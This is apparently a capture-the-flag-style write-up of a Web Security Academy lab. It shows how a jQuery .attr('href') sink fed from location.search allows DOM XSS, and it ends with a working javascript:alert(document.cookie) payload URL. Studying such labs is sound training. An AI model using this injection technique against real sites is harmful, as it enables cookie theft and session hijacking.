## 🧪 Lab: DOM XSS in jQuery anchor href attribute sink using location.search source (APPRENTICE)

---

## 🎯 Mission Description  
This lab contains a DOM-based cross-site scripting vulnerability on the feedback page. It uses jQuery's `$()` function to locate an anchor element and updates its `href` attribute using unsanitized input from `location.search`.

---

## 🎯 Mission Objective  
Trigger an alert displaying `document.cookie` by exploiting the vulnerable "back" link.

---

## 🪜 Steps

1. Go to the feedback page:

   ```
   https://0a1300e3046afaee80d203a800f8009c.web-security-academy.net/feedback?returnPath=/
   ```

2. View the source code and find this jQuery block:

   ```javascript
   $(function() {
     $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
   });
   ```

   → This takes the `returnPath` parameter from the URL and sets it as the `href` attribute of the `#backLink` anchor.

3. Try a benign test like:

   ```
   ?returnPath=/profile
   ```

   This results in:

   ```html
   <a id="backLink" href="/profile">Go back</a>
   ```

   ✅ Confirms direct injection into `href`.

4. Try injecting a `javascript:` URL:

   ```
   ?returnPath=javascript:alert(document.cookie)
   ```

   Which becomes:

   ```html
   <a id="backLink" href="javascript:alert(document.cookie)">Go back</a>
   ```

5. Click the "Go back" link → 💥 Alert fires.

---

## 💣 Final Payload

```
https://0a1300e3046afaee80d203a800f8009c.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```

---

## 📝 Notes  
- Vulnerable sink: `.attr("href", ...)`
- Input source: `location.search → returnPath`
- The sink blindly trusts input and allows `javascript:` URLs
- DOM XSS often abuses `javascript:` links when `href` attributes are set directly from unsanitized sources

---

**✅ Status: Solved**
